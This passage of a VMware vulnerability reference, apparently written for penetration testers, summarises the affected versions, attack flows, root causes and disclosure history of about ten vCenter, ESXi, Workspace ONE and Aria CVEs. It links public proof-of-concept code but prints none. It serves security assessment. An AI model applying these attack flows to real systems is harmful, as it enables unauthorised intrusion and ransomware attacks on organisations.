- **Disclosure:** VMware advisory VMSA-2021-0020 published 2021-09-21. Working PoC by @testanull / @wvu released within ~72h; CISA issued an emergency alert 2021-09-24. **CISA KEV:** added 2021-11-03. Year discovered 2021, patched 2021.
- **References:** https://www.vmware.com/security/advisories/VMSA-2021-0020.html ; https://www.cisa.gov/news-events/alerts/2021/09/24/vmware-vcenter-server-vulnerability-cve-2021-22005-under-active-exploit ; https://www.rapid7.com/blog/post/2021/09/21/critical-vcenter-server-file-upload-vulnerability-cve-2021-22005/ ; https://www.bleepingcomputer.com/news/security/working-exploit-released-for-vmware-vcenter-cve-2021-22005-bug/

### 4. CVE-2022-22954 — Workspace ONE Access / Identity Manager FreeMarker SSTI → RCE
- **Affected:** Workspace ONE Access 21.08.0.1, 21.08.0.0, 20.10.0.1, 20.10.0.0; Identity Manager 3.3.3 → 3.3.6; vRealize Automation 7.6.
- **Attack flow:** Unauth GET to `/catalog-portal/ui/oauth/verify?deviceUdid=${...}` injects a FreeMarker template; `freemarker.template.utility.Execute` runs OS commands as the `horizon` service account. Single-request RCE.
- **Root cause:** Catalog-portal endpoint passed attacker-controlled query parameter into FreeMarker render without sandboxing the Execute utility.
- **Disclosure:** Reported by Steven Seeley (mr_me) of Source Incite; VMware advisory VMSA-2022-0011 published 2022-04-06. PoCs public within 48h; widespread mass-exploitation followed. **CISA KEV:** added 2022-04-14. CISA AA22-138B (May 2022) documents IR engagements at "large organizations" exploited via this CVE. Year discovered 2022, patched 2022.
- **References:** https://www.vmware.com/security/advisories/VMSA-2022-0011.html ; https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-138b ; https://srcincite.io/blog/2022/04/19/cve-2022-22954-vmware-workspace-one-access-pre-auth-rce.html ; https://www.crowdsec.net/blog/new-surge-in-vmware-cve-2022-22954-exploit-attempts

### 5. CVE-2022-22972 — Workspace ONE Access / Identity Manager / vRealize Automation Host-header authentication bypass
- **Affected:** Workspace ONE Access 21.08.0.1; Identity Manager 3.3.3–3.3.6; vRealize Automation 7.6 (and downstream Cloud Foundation bundles).
- **Attack flow:** Manipulate the HTTP `Host` header during local-domain login flow; the server routes its internal validation request to the attacker-controlled hostname → returns admin session without legitimate credentials.
- **Root cause:** Host header used unvalidated as the target for the internal auth-validation request — classic SSRF-into-self with trust elevation.
- **Disclosure:** Reported by Bruno López of Innotec Security; VMware advisory VMSA-2022-0014 published 2022-05-18. **CISA Emergency Directive 22-03** (2022-05-18) ordered all U.S. federal civilian agencies to patch or remove affected VMware installations by 2022-05-24 — the same agencies that had just been told the same thing for CVE-2022-22954 six weeks earlier. Year discovered 2022, patched 2022.
- **References:** https://www.vmware.com/security/advisories/VMSA-2022-0014.html ; https://www.cisa.gov/news-events/directives/ed-22-03-mitigate-vmware-vulnerabilities ; https://www.rapid7.com/blog/post/2022/05/19/cve-2022-22972-critical-authentication-bypass-in-vmware-workspace-one-access-identity-manager-and-vrealize-automation/ ; https://www.assetnote.io/resources/research/understanding-cve-2022-22972-vmware-workspace-one-access-auth-bypass

### 6. CVE-2023-20887 — VMware Aria Operations for Networks (vRealize Network Insight) pre-auth command injection → RCE
- **Affected:** Aria Operations for Networks (formerly vRealize Network Insight / vRNI) 6.2 through 6.10.
- **Attack flow:** Two-issue chain — (a) reach the Apache Thrift endpoint exposed on the management interface despite no authentication, (b) inject shell metacharacters into a parameter passed to a `bash -c` invocation. Single unauth POST → root.
- **Root cause:** Thrift RPC endpoint exposed without auth + downstream shell-string composition with user input.
- **Disclosure:** Reported by Sina Kheirkhah (@SinSinology) of Summoning Team to ZDI; advisory VMSA-2023-0012 published 2023-06-07. Public PoC released same week. **CISA KEV:** added 2023-06-22 after observed in-the-wild exploitation. Year discovered 2023, patched 2023.
- **References:** https://www.vmware.com/security/advisories/VMSA-2023-0012.html ; https://summoning.team/blog/vmware-vrealize-network-insight-rce-cve-2023-20887/ ; https://blogs.juniper.net/en-us/threat-research/cve-2023-20887-vmware-aria-operations-for-networks-unauthenticated-remote-code-execution ; https://github.com/sinsinology/CVE-2023-20887

### 7. CVE-2023-34048 — vCenter Server DCERPC pre-auth out-of-bounds write → RCE (APT-exploited zero-day)
- **Affected:** vCenter Server 7.0 < 7.0 U3o, 8.0 < 8.0 U1d/U2b; VMware Cloud Foundation bundles.
- **Attack flow:** Unauthenticated network actor sends a crafted DCE/RPC packet to the vmdir/vmafd service → out-of-bounds write in the DCE/RPC protocol implementation → memory corruption → code execution. Forensic tell: `vmdird` crashes shortly before backdoor deployment.
- **Root cause:** OOB write in DCE/RPC marshalling layer of vCenter management services.
- **Disclosure:** Reported by Grigory Dorodnov of Trend Micro ZDI (publication ZDI-23-1623, suggesting a paid ZDI submission — bounty undisclosed). Advisory VMSA-2023-23 published 2023-10-24. **Mandiant** later attributed in-the-wild exploitation to **UNC3886** (China-nexus espionage) since late 2021 — a ~1.5-year zero-day window before patch. **CISA KEV:** added 2024-01-22. Year discovered 2023 (patched), exploited since 2021.
- **References:** https://www.vmware.com/security/advisories/VMSA-2023-0023.html ; https://www.zerodayinitiative.com/advisories/ZDI-23-1623/ ; https://cloud.google.com/blog/topics/threat-intelligence/chinese-vmware-exploitation-since-2021/ (Mandiant) ; https://www.bleepingcomputer.com/news/security/chinese-hackers-exploit-vmware-bug-as-zero-day-for-two-years/

### 8. CVE-2024-37085 — ESXi Active Directory integration "ESX Admins" auth bypass (ransomware-favorite)
- **Affected:** ESXi 7.0 < ESXi70U3q-24585291, ESXi 8.0 < ESXi80U3-24022510; vCenter-managed clusters where ESXi is joined to AD.
- **Attack flow:** Attacker with sufficient AD rights creates (or re-creates after deletion) a group literally named `ESX Admins` and adds an account. ESXi auto-grants every member full admin rights without checking that the group existed at join time. End-to-end: AD foothold → group create → SSH/API root on every domain-joined ESXi host → mass VM encryption.
- **Root cause:** Hard-coded trust of group name `ESX Admins` with no domain-scoped identity validation.
- **Disclosure:** Reported by Microsoft Threat Intelligence; advisory VMSA-2024-0013 published 2024-06-25. **Microsoft Security Blog** documents pre-patch exploitation by **Storm-0506 (Black Basta), Storm-1175, Octo Tempest, and Manatee Tempest** ransomware operators — including a confirmed Black Basta deployment at a North American engineering firm. **CISA KEV:** added 2024-07-30. Year discovered 2024 (exploited as 0-day), patched 2024.
- **References:** https://www.vmware.com/security/advisories/VMSA-2024-0013.html ; https://www.microsoft.com/en-us/security/blog/2024/07/29/ransomware-operators-exploit-esxi-hypervisor-vulnerability-for-mass-encryption/ ; https://www.rapid7.com/blog/post/2024/07/30/vmware-esxi-cve-2024-37085-targeted-in-ransomware-campaigns/ ; https://thehackernews.com/2024/07/vmware-esxi-flaw-exploited-by.html

### 9. CVE-2024-22273 — ESXi / Workstation / Fusion / vCenter storage controller OOB read/write
- **Note on the original ticket:** This CVE was listed in the brief as "Aria SSRF," but the actual NVD record describes an **ESXi/vCenter storage controller out-of-bounds read/write**, not an Aria SSRF. The closest Aria SSRF-adjacent issue in the 2024 cycle is **CVE-2023-34063** (VMSA-2024-0001) — Aria Automation missing access control allowing authenticated cross-org access; CVSSv3 9.9. Both are cited so the matrix is technically accurate.
- **Affected (CVE-2024-22273):** ESXi 7.0/8.0, Workstation 17.x, Fusion 13.x. vCenter Server packaged variants. Requires VM-local access with storage controllers enabled.
- **Attack flow:** VM with storage controllers enabled can issue crafted I/O to trigger OOB read/write on the host → information disclosure or DoS of the host (escape not directly demonstrated). CVSS 8.1 (Important).
- **Root cause:** Missing bounds check in the storage controller emulation path.
- **Disclosure:** Reported by Hao Zheng (@zhz) and Jiaqing Huang (@s0duku) of TianGong Team, Legendsec @ Qi'anxin Group. Advisory VMSA-2024-0011 published 2024-05-21. Year discovered 2024, patched 2024.
- **References:** https://www.vmware.com/security/advisories/VMSA-2024-0011.html ; https://nvd.nist.gov/vuln/detail/CVE-2024-22273 ; https://www.rapid7.com/db/vulnerabilities/vmsa-2024-0011-cve-2024-22273/
- **Aria-specific companion — CVE-2023-34063 (VMSA-2024-0001):** Aria Automation 8.11.x–8.14.x missing access control — authenticated actor obtains unauthorized cross-organization access to remote workflows. CVSSv3 9.9. Patched in Aria Automation 8.16. References: https://www.vmware.com/security/advisories/VMSA-2024-0001.html ; https://www.cisa.gov/news-events/alerts/2024/01/17/vmware-releases-security-advisory-aria-automation

### 10. CVE-2020-3992 + CVE-2021-21974 — ESXi OpenSLP pre-auth use-after-free / heap overflow (ESXiArgs ransomware vector)
- **Affected:** ESXi 6.5, 6.7, 7.0 prior to the OpenSLP patches (ESXi70U1c-17325551 / ESXi670-202102401-SG / ESXi650-202102101-SG). OpenSLP service on TCP/427.
- **Attack flow:** Unauth attacker sends a crafted SLP packet to port 427 → memory corruption in the SLP daemon → code execution as root on the hypervisor. CVE-2020-3992 is the use-after-free (VMSA-2020-0023); CVE-2021-21974 is the heap-overflow variant (VMSA-2021-0002, same release wave as 21972).
- **Root cause:** OpenSLP daemon — long-deprecated, exposed by default until 2021 — has unsafe parsing of SLP message frames.
- **Disclosure:** CVE-2020-3992 reported by Lucas Leong of Trend Micro ZDI (ZDI-20-1376, paid ZDI submission). CVE-2021-21974 reported by Lucas Leong of Trend Micro ZDI as well. **CISA KEV:** CVE-2020-3992 added 2021-11-03; CVE-2021-21974 added 2023-02-08. **ESXiArgs ransomware campaign** (Feb 2023) hit ~3,800 internet-exposed hosts via CVE-2021-21974 — two years after patch was available. VMware disabled SLP by default in subsequent releases. Year discovered 2020/2021, patched 2020/2021, mass-exploited 2023.
- **References:** https://www.vmware.com/security/advisories/VMSA-2020-0023.html ; https://www.vmware.com/security/advisories/VMSA-2021-0002.html ; https://www.zerodayinitiative.com/advisories/ZDI-20-1376/ ; https://www.cisa.gov/known-exploited-vulnerabilities-catalog ; https://www.bleepingcomputer.com/news/security/massive-esxiargs-ransomware-attack-targets-vmware-esxi-servers-worldwide/ ; https://www.recordedfuture.com/blog/esxiargs-ransomware-targets-vmware-esxi-openslp-servers

### Bonus: CVE-2022-31656 — Workspace ONE Access / Identity Manager / vRealize Automation auth bypass (post-22972 follow-up)
- **Affected:** Same product matrix as 22954/22972. Workspace ONE Access 21.08.x; Identity Manager 3.3.3–3.3.6; vRealize Automation 7.6.
- **Attack flow:** Network-only actor obtains admin without authenticating; chained with CVE-2022-31659 (auth'd RCE) the pair yields pre-auth admin RCE — the spiritual successor to the 22954+22972 pair.
- **Root cause:** Local-domain auth flow trusted a parameter that could be supplied without prior auth.
- **Disclosure:** Reported by **PetrusViet** of VNG Security; advisory VMSA-2022-0021 published 2022-08-02. PetrusViet released chain writeup + PoC. Year 2022.
- **References:** https://www.vmware.com/security/advisories/VMSA-2022-0021.html ; https://www.greynoise.io/blog/vmware-workspace-one-vulnerabilities-cve-2022-31656-and-cve-2022-31659 ; https://attackerkb.com/topics/RuMGC8Q1pE/cve-2022-31656

---

## Key meta-references (cross-CVE)

- **CISA KEV catalog (VMware filter):** https://www.cisa.gov/known-exploited-vulnerabilities-catalog?search_api_fulltext=vmware — VMware is one of the most-represented vendors; cross-check any vCenter/ESXi/Workspace finding here before grading severity.
- **Broadcom (formerly VMware) advisories index:** https://support.broadcom.com/security-advisories (legacy https://www.vmware.com/security/advisories.html). Search by VMSA-YYYY-NNNN.
- **ZDI published advisories:** https://www.zerodayinitiative.com/advisories/published/ — filter "VMware" for the canonical paid-bounty disclosures (CVE-2020-3992, CVE-2023-34048, multiple Aria Operations and vRNI).
- **Mandiant UNC3886 reporting:** Google Cloud Threat Intelligence has the deepest published forensic trail on long-tail vCenter zero-day exploitation. Pair with the `mid-engagement-ir-detection` skill when working a target where vCenter is reachable.

The pattern across every entry above: **VMware management-plane CVEs are pre-auth, network-reachable, and mass-exploited within days of patch.** When external recon surfaces any of these products at a current-minus-one patch level, that is a Critical finding worth a same-day callout in the deliverable — not a Medium info-disclosure.
